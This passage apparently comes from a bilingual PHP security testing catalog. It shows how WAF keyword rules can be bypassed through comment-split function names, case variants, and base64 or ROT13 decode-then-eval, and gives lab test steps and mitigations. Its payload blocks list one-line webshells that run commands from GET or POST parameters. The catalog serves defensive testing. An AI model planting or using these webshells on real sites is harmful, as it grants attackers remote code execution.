opsecTips.en: PHP Request-Parameter Webshells cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: PHP 标识符注释分割样例

description.zh: 尝试用块注释拆分 system、eval、assert 等函数名，验证 PHP 词法规则与上传/WAF 检测之间的差异；多数拆分函数名并非有效 PHP。
description.en: Attempts to split system, eval, assert, and related function names with block comments to compare PHP lexical rules with upload or WAF detection; most split identifiers are not valid PHP.

subCategory.zh: PHP 词法与 WAF 差异

overview.zh: PHP 标识符注释分割样例用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符。成立前提为：输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符。判定必须包含WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应，放行但语法错误记为阴性，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP Identifier Comment-Splitting Samples compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier. It applies when input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax. Evidence requires WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符时，可能造成“WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax, potentially causing whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 先对每行执行 php -l，再向测试 WAF 提交；只有同时通过 lexer 并产生固定无害结果的行才进入浏览器或请求回归。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: run php -l on every line before submitting it to a test WAF, and only carry lines that both parse and produce a fixed harmless result into request regression. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 应用侧移除可写可执行 PHP 路径，WAF 在统一解码后使用语法感知规则；维护条目必须明确标记无效词法变体。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: remove writable executable PHP paths, use syntax-aware WAF rules after canonicalization, and explicitly tag lexically invalid variants in the catalog. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

title.zh: 固定“PHP 标识符注释分割样例”多层版本
title.en: Pin the PHP Identifier Comment-Splitting Samples processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应，放行但语法错误记为阴性”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP 标识符注释分割样例”
title.en: Run a single-variable PHP Identifier Comment-Splitting Samples check

description.zh: 测试步骤为：先对每行执行 php -l，再向测试 WAF 提交；只有同时通过 lexer 并产生固定无害结果的行才进入浏览器或请求回归。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: run php -l on every line before submitting it to a test WAF, and only carry lines that both parse and produce a fixed harmless result into request regression. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php sys/**/tem($_GET['cmd']); ?>
<?php syst/**/em($_GET['cmd']); ?>
<?php e/**/va/**/l($_POST['cmd']);?>
<?php a/**/ss/**/ert($_POST['cmd']);?>
<?php pa/**/sst/**/hru($_GET['cmd']); ?>
<?php sh/**/el/**/l_ex/**/ec($_GET['cmd']); ?>
<?php fil/**/e_ge/**/t_con/**/tents('/flag'); ?>

title.zh: 统一规范化并移除求值路径
title.en: Align normalization and remove evaluation

description.zh: 实施“应用侧移除可写可执行 PHP 路径，WAF 在统一解码后使用语法感知规则；维护条目必须明确标记无效词法变体”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply remove writable executable PHP paths, use syntax-aware WAF rules after canonicalization, and explicitly tag lexically invalid variants in the catalog and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

review.rationale: PHP 标识符注释分割样例保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已固定“PHP 标识符注释分割样例”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP Identifier Comment-Splitting Samples are pinned, confirming that input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative.

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier.

opsecTips.zh: PHP 标识符注释分割样例停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符”。
opsecTips.en: PHP Identifier Comment-Splitting Samples stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier.

opsecTips.zh: PHP 标识符注释分割样例清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Identifier Comment-Splitting Samples cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

name.zh: PHP 函数名大小写变体

description.zh: 使用 SYSTEM、System、sYstem 等大小写形式验证 WAF 关键字匹配与 PHP 函数调用规则的差异，并区分 PHP 版本中的历史行为。
description.en: Uses SYSTEM, System, sYstem, and related case forms to compare WAF keyword matching with PHP function-call rules across PHP versions.

overview.zh: PHP 函数名大小写变体用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是边缘规则是否区分大小写，而 PHP 运行时是否将内置函数名作为不区分大小写标识符处理。成立前提为：可控 PHP 代码进入可执行处理器，WAF 使用大小写敏感关键字规则，且危险内置函数在目标 PHP 中可用。判定必须包含相同请求在 WAF 的动作、PHP lint 与固定标记输出上可关联，且仅大小写发生变化，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP Function-Name Case Variants compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether edge rules are case-sensitive while the PHP runtime treats built-in function identifiers case-insensitively. It applies when controllable PHP code reaches an executable handler, the WAF uses case-sensitive keyword rules, and the dangerous built-in remains available in the target PHP version. Evidence requires the same request correlates across WAF action, PHP lint, and fixed marker output with case as the only changed variable; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在可控 PHP 代码进入可执行处理器，WAF 使用大小写敏感关键字规则，且危险内置函数在目标 PHP 中可用时，可能造成“边缘规则是否区分大小写，而 PHP 运行时是否将内置函数名作为不区分大小写标识符处理”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when controllable PHP code reaches an executable handler, the WAF uses case-sensitive keyword rules, and the dangerous built-in remains available in the target PHP version, potentially causing whether edge rules are case-sensitive while the PHP runtime treats built-in function identifiers case-insensitively. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 使用同一无害函数参数逐个提交七种大小写，固定编码、空白和请求路径，记录 WAF 与 PHP 的差异矩阵。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: submit the seven case variants with the same harmless function argument while holding encoding, whitespace, and path constant, and record a WAF-versus-PHP matrix. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: WAF 规则在规范化后执行不区分大小写的语法分析，应用移除动态 PHP 写入与危险函数入口，并用文件不可执行策略兜底。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: apply case-insensitive syntax analysis after canonicalization at the WAF, remove dynamic PHP write and dangerous-function entry points, and enforce non-executable file storage. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

title.zh: 固定“PHP 函数名大小写变体”多层版本
title.en: Pin the PHP Function-Name Case Variants processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“可控 PHP 代码进入可执行处理器，WAF 使用大小写敏感关键字规则，且危险内置函数在目标 PHP 中可用”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that controllable PHP code reaches an executable handler, the WAF uses case-sensitive keyword rules, and the dangerous built-in remains available in the target PHP version.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“相同请求在 WAF 的动作、PHP lint 与固定标记输出上可关联，且仅大小写发生变化”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using the same request correlates across WAF action, PHP lint, and fixed marker output with case as the only changed variable to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP 函数名大小写变体”
title.en: Run a single-variable PHP Function-Name Case Variants check

description.zh: 测试步骤为：使用同一无害函数参数逐个提交七种大小写，固定编码、空白和请求路径，记录 WAF 与 PHP 的差异矩阵。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: submit the seven case variants with the same harmless function argument while holding encoding, whitespace, and path constant, and record a WAF-versus-PHP matrix. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php SYSTEM($_GET['cmd']); ?>
<?php System($_GET['cmd']); ?>
<?php sYstem($_GET['cmd']); ?>
<?php EVAL($_POST['cmd']);?>
<?php ASSERT($_POST['cmd']);?>
<?php PASSTHRU($_GET['cmd']); ?>
<?php SHELL_EXEC($_GET['cmd']); ?>

title.zh: 统一规范化并移除求值路径
title.en: Align normalization and remove evaluation

description.zh: 实施“WAF 规则在规范化后执行不区分大小写的语法分析，应用移除动态 PHP 写入与危险函数入口，并用文件不可执行策略兜底”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply apply case-insensitive syntax analysis after canonicalization at the WAF, remove dynamic PHP write and dangerous-function entry points, and enforce non-executable file storage and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

review.rationale: PHP 函数名大小写变体保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已固定“PHP 函数名大小写变体”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：可控 PHP 代码进入可执行处理器，WAF 使用大小写敏感关键字规则，且危险内置函数在目标 PHP 中可用。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP Function-Name Case Variants are pinned, confirming that controllable PHP code reaches an executable handler, the WAF uses case-sensitive keyword rules, and the dangerous built-in remains available in the target PHP version.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和相同请求在 WAF 的动作、PHP lint 与固定标记输出上可关联。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and the same request correlates across WAF action, PHP lint, and fixed marker output with case as the only changed variable.

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得相同请求在 WAF 的动作、PHP lint 与固定标记输出上可关联。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“边缘规则是否区分大小写，而 PHP 运行时是否将内置函数名作为不区分大小写标识符处理”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and the same request correlates across WAF action, PHP lint, and fixed marker output with case as the only changed variable. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether edge rules are case-sensitive while the PHP runtime treats built-in function identifiers case-insensitively.

opsecTips.zh: PHP 函数名大小写变体停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“边缘规则是否区分大小写，而 PHP 运行时是否将内置函数名作为不区分大小写标识符处理”。
opsecTips.en: PHP Function-Name Case Variants stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether edge rules are case-sensitive while the PHP runtime treats built-in function identifiers case-insensitively.

opsecTips.zh: PHP 函数名大小写变体清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Function-Name Case Variants cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

name.zh: PHP Base64 解码后动态求值

description.zh: 将 GET 或 POST 参数先 base64_decode 再交给 eval/assert，验证编码内容是否绕过检测并在 PHP 运行时还原为代码。
description.en: Decodes GET or POST parameters with base64_decode before eval or assert, testing whether encoded content bypasses inspection and is restored as PHP code.

overview.zh: PHP Base64 解码后动态求值用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数。成立前提为：攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义。判定必须包含编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP Base64 Decode-Then-Evaluate Patterns compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator. It applies when an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version. Evidence requires the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义时，可能造成“WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version, potentially causing whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 先用编码后的固定字符串验证解码链，再以只设置局部变量的无害 PHP 表达式确认求值，不提交系统命令。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: verify decoding with an encoded fixed string, then confirm evaluation with a harmless PHP expression that only sets a local variable without system commands. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 删除解码后求值设计，使用结构化数据与严格 schema；WAF 对允许的编码字段解码后检查，上传目录保持不可执行。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: remove decode-then-evaluate designs, use structured data with a strict schema, inspect allowed encoded fields after decoding, and keep upload storage non-executable. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

title.zh: 固定“PHP Base64 解码后动态求值”多层版本
title.en: Pin the PHP Base64 Decode-Then-Evaluate Patterns processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP Base64 解码后动态求值”
title.en: Run a single-variable PHP Base64 Decode-Then-Evaluate Patterns check

description.zh: 测试步骤为：先用编码后的固定字符串验证解码链，再以只设置局部变量的无害 PHP 表达式确认求值，不提交系统命令。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: verify decoding with an encoded fixed string, then confirm evaluation with a harmless PHP expression that only sets a local variable without system commands. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php eval(base64_decode($_POST['cmd']));?>
<?php eval(base64_decode($_GET['cmd']));?>
<?php assert(base64_decode($_POST['cmd']));?>
<?php $a=base64_decode($_POST['cmd']);eval($a);?>

title.zh: 统一规范化并移除求值路径
title.en: Align normalization and remove evaluation

description.zh: 实施“删除解码后求值设计，使用结构化数据与严格 schema；WAF 对允许的编码字段解码后检查，上传目录保持不可执行”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply remove decode-then-evaluate designs, use structured data with a strict schema, inspect allowed encoded fields after decoding, and keep upload storage non-executable and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

review.rationale: PHP Base64 解码后动态求值保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已固定“PHP Base64 解码后动态求值”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP Base64 Decode-Then-Evaluate Patterns are pinned, confirming that an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate.

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator.

opsecTips.zh: PHP Base64 解码后动态求值停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数”。
opsecTips.en: PHP Base64 Decode-Then-Evaluate Patterns stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator.

opsecTips.zh: PHP Base64 解码后动态求值清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Base64 Decode-Then-Evaluate Patterns cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

name.zh: PHP ROT13 解码后动态求值

description.zh: 通过 str_rot13 或 ROT13+Base64 链还原参数后调用 eval，验证多阶段解码与检测顺序不一致造成的 PHP 代码执行风险。
description.en: Restores parameters through str_rot13 or ROT13 plus Base64 before eval, testing PHP code-execution risk from inconsistent multi-stage decoding and inspection order.

overview.zh: PHP ROT13 解码后动态求值用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval。成立前提为：参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序。判定必须包含每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP ROT13 Decode-Then-Evaluate Patterns compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval. It applies when a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order. Evidence requires each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序时，可能造成“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order, potentially causing whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 分别测试纯 ROT13、GET/POST 来源和 ROT13+Base64 三条链，只使用固定字符串与局部变量表达式，并保存每层解码值。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: test pure ROT13, GET versus POST, and ROT13 plus Base64 separately using fixed strings and local-variable expressions while retaining every decoded stage. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 禁止任何解码后 eval 路径，编码字段采用明确格式和长度限制，安全设备与应用共享同一规范化顺序。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: prohibit all decode-then-eval paths, constrain encoded fields by explicit format and length, and align security devices and applications on one normalization order. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

title.zh: 固定“PHP ROT13 解码后动态求值”多层版本
title.en: Pin the PHP ROT13 Decode-Then-Evaluate Patterns processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP ROT13 解码后动态求值”
title.en: Run a single-variable PHP ROT13 Decode-Then-Evaluate Patterns check

description.zh: 测试步骤为：分别测试纯 ROT13、GET/POST 来源和 ROT13+Base64 三条链，只使用固定字符串与局部变量表达式，并保存每层解码值。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: test pure ROT13, GET versus POST, and ROT13 plus Base64 separately using fixed strings and local-variable expressions while retaining every decoded stage. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php eval(str_rot13($_POST['cmd']));?>
<?php eval(str_rot13($_GET['cmd']));?>
<?php eval(str_rot13(base64_decode($_POST['cmd'])));?>

title.zh: 统一规范化并移除求值路径
title.en: Align normalization and remove evaluation

description.zh: 实施“禁止任何解码后 eval 路径，编码字段采用明确格式和长度限制，安全设备与应用共享同一规范化顺序”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply prohibit all decode-then-eval paths, constrain encoded fields by explicit format and length, and align security devices and applications on one normalization order and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

review.rationale: PHP ROT13 解码后动态求值保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已固定“PHP ROT13 解码后动态求值”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP ROT13 Decode-Then-Evaluate Patterns are pinned, confirming that a parameter reaches eval after str_rot13 or combined decoding while defenses inspect only raw request bytes or decode in a different order.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request.

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and each intermediate decoded value, WAF action, and harmless PHP expression result are reproducible in one request. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval.

